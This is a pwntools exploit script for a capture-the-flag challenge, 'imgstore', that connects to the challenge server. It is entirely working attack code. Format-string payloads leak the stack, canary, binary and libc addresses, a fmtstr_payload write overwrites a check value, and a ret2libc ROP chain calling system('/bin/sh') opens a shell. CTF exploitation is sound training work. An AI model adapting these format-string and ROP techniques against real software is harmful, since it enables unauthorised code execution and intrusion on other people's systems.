#!/usr/bin/env python3

from pwn import *

exe = ELF("./imgstore_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("imgstore.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=True, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def send(io, s):
    assert len(s) <= 0x29
    io.sendlineafter(b"title: ", s + b"@@")
    io.recvuntil(b"--> ")
    ret = io.recvuntil(b"@@")[:-2]
    io.sendlineafter(b"[y/n]: ", b"y")
    return ret


def main():
    io = conn()
    io.sendlineafter(b">> ", b"3")


    stack_leak = int(send(io, b"%1$p"), 16)
    info(f"stack_leak: {hex(stack_leak)}")
    cookie = int(send(io, b"%17$p"), 16)
    info(f"cookie: {hex(cookie)}")
    bin_leak = int(send(io, b"%19$p"), 16)
    info(f"bin_leak: {hex(bin_leak)}")
    libc_leak = int(send(io, b"%25$p"), 16)
    info(f"libc_leak: {hex(libc_leak)}")
    libc.address = libc_leak + (0x7ffff7dd5000-0x7ffff7df9083)
    info(f"libc.address: {hex(libc.address)}")
    stack_offset = 0x7fffffffe608-0x7fffffffbf60
    randn = stack_leak + stack_offset
    info(f"randn: {hex(randn)}")

    payload = fmtstr_payload(8, {randn: 2357714629}, write_size='short')
    io.sendlineafter(b"title: ", payload)

    payload = b""
    payload += p64(cookie)
    payload += p64(0x4141)
    # 0x00000000023b6a: pop rdi; ret;
    pop_rdi = p64(libc.address + 0x00000000023b6a)
    # 0x00000000037d06: ret; 
    ret = p64(0x00000000037d06+libc.address)

    payload += pop_rdi
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += ret
    payload += p64(libc.sym['system'])
    io.sendlineafter(b"UNDER DEVELOPMENT", b"A" * 104 + payload)
    
    io.interactive()


if __name__ == "__main__":
    main()
